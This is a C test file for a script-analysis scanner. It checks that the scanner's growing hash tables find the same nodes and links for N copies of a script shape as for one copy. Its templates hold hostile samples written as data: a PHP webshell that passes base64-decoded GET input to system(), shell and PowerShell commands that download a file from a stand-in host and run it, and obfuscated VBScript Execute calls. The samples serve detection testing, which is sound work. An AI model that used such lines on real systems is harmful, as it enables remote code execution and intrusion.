/*
 * genome / diag_text_tables_grow - the tables of the TEXT route that grow with the text (its variables, the shell reader's variables, the functions a text defines, the keys of the relation layer's edges, the
 * paths nodes hold) keep finding what they hold across every growth.
 *
 * Each is an open-addressing table that doubles when it passes half full (diag_oatab.h) and moves its entries by a hash the table's owner gives; an entry moved by the wrong hash is
 * one the next lookup does not find, and nothing in a small text shows it - the first growth is past 32 entries (functions, paths), 128 (variables, edge keys). So a program of N
 * copies of one shape (N functions each taking a parameter and handing it to a sink, called once each; N files fetched and then run) is read, and what the route finds must be N
 * times what it finds for one copy - the nodes and the links - for N from 1 to 700, through every growth, with the names spelled in the case the definition used and in another
 * (the functions of php are not case sensitive: a rehash that dropped the fold would lose every call spelled the other way).
 *
 * usage: diag_text_tables_grow
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <phenotype/diag_scan.h>
#include <textual/textual.h>

static int fails;

#define CK(c, ...) do { if (!(c)) { printf("  FAIL %s:%d  ", __FILE__, __LINE__); printf(__VA_ARGS__); printf("\n"); fails++; } } while (0)

static int app(void *u, const struct kgenome_textual_call *c, const uint8_t *in, uint32_t len, uint8_t *out, uint32_t cap, uint32_t *n)
{
	(void)u; (void)c; (void)in; (void)len; (void)out; (void)cap; (void)n;
	return 0;
}

struct stat {
	uint32_t nodes, inputs, shared;
};

static struct stat stats(const char *t, size_t n, uint32_t lang)
{
	struct kgenome_diag_text_req rq = { .base = (const uint8_t *)t, .size = n, .lang = lang, .apply = app };
	struct kgenome_diag_scan *s = kgenome_diag_scan_text(&rq);
	struct stat st = { 0, 0, 0 };
	uint32_t i, k;

	if (!s)
		return st;
	st.nodes = kgenome_diag_scan_count(s);
	for (i = 0; i < st.nodes; i++) {
		const struct kgenome_diag_hit *h = kgenome_diag_scan_at(s, i);

		st.inputs += h->n_in;
		for (k = 0; k < h->n_in && k < 4u; k++)
			st.shared += h->in[k].kind == KGENOME_DIAG_KIND_SHARED;
	}
	kgenome_diag_scan_free(s);
	return st;
}

struct shape {
	const char *name;
	uint32_t    lang;
	const char *head;
	const char *def;        /* one copy of the definitions: %u is the copy's number, %c the first letter of a name (the case of its spelling) */
	const char *use;        /* one copy of the uses */
	int         two_case;   /* the uses may be spelled in the other case */
};

static const struct shape SH[] = {
	{ "php functions, parameters and calls", KGENOME_TEXTUAL_LANG_PHP, "<?php\n", "function %cf%u($p) { return system($p); }\n", "%cf%u(base64_decode($_GET['c']));\n", 1 },
	{ "php variables of one scope each", KGENOME_TEXTUAL_LANG_PHP, "<?php\n", "$v%u = base64_decode($_GET['k%u']); system($v%u);\n", "", 0 },
	{ "shell files fetched, made executable and run", KGENOME_TEXTUAL_LANG_SH, "", "wget -O /var/p%u http://h/%u\nchmod +x /var/p%u\nsh /var/p%u\n", "", 0 },
	{ "powershell files fetched and run", KGENOME_TEXTUAL_LANG_PSH, "", "Invoke-WebRequest -Uri http://h/%u -OutFile C:\\\\x\\\\p%u.exe\nStart-Process C:\\\\x\\\\p%u.exe\n", "", 0 },
	{ "shell paths held in variables (the command reader's table)", KGENOME_TEXTUAL_LANG_SH, "", "P%u=/var/p%u\nwget -O $P%u http://h/%u\nsh $P%u\n", "", 0 },
	{ "vbscript functions called by name", KGENOME_TEXTUAL_LANG_VBS, "", "Function F%u(p)\r\n F%u = StrReverse(p)\r\nEnd Function\r\n", "Execute F%u(StrReverse(\"x\"))\r\n", 0 },
};

/* `tpl` with each "%u" written as the copy's number and each "%c" as the first letter of a name in the case `c` */
static size_t expand(char *out, size_t cap, const char *tpl, uint32_t n, char c)
{
	size_t w = 0;

	for (; *tpl && w + 16u < cap; tpl++) {
		if (tpl[0] == '%' && tpl[1] == 'u') {
			w += (size_t)snprintf(out + w, cap - w, "%u", n);
			tpl++;
		} else if (tpl[0] == '%' && tpl[1] == 'c') {
			out[w++] = c;
			tpl++;
		} else {
			out[w++] = *tpl;
		}
	}
	out[w] = 0;
	return w;
}

static size_t build(char *buf, size_t cap, const struct shape *sp, uint32_t n, int upper)
{
	size_t w = 0;
	uint32_t i;

	w += (size_t)snprintf(buf + w, cap - w, "%s", sp->head);
	for (i = 0; i < n; i++)
		w += expand(buf + w, cap - w, sp->def, i, 'f');
	for (i = 0; i < n; i++)
		w += expand(buf + w, cap - w, sp->use, i, upper ? 'F' : 'f');
	return w;
}

int main(void)
{
	static char buf[1u << 20];
	size_t k;

	for (k = 0; k < sizeof SH / sizeof SH[0]; k++) {
		const struct shape *sp = &SH[k];
		int upper;

		for (upper = 0; upper <= (sp->two_case ? 1 : 0); upper++) {
			struct stat one, many;
			static const uint32_t N[] = { 2, 31, 32, 33, 100, 127, 128, 129, 300, 700 };
			size_t j, w;

			w = build(buf, sizeof buf, sp, 1u, upper);
			one = stats(buf, w, sp->lang);
			CK(one.nodes > 0u && one.inputs > 0u, "%s: the one copy makes nodes and links (%u, %u)", sp->name, one.nodes, one.inputs);
			for (j = 0; j < sizeof N / sizeof N[0]; j++) {
				w = build(buf, sizeof buf, sp, N[j], upper);
				many = stats(buf, w, sp->lang);
				CK(many.nodes == N[j] * one.nodes && many.inputs == N[j] * one.inputs && many.shared == N[j] * one.shared,
				   "%s%s: %u copies make %u nodes, %u links, %u shared (one copy: %u, %u, %u)", sp->name, upper ? " (uses in the other case)" : "", N[j],
				   many.nodes, many.inputs, many.shared, one.nodes, one.inputs, one.shared);
			}
		}
	}
	printf("genome diag_text_tables_grow: %s\n", fails ? "FAILED" : "ok");
	return fails != 0;
}
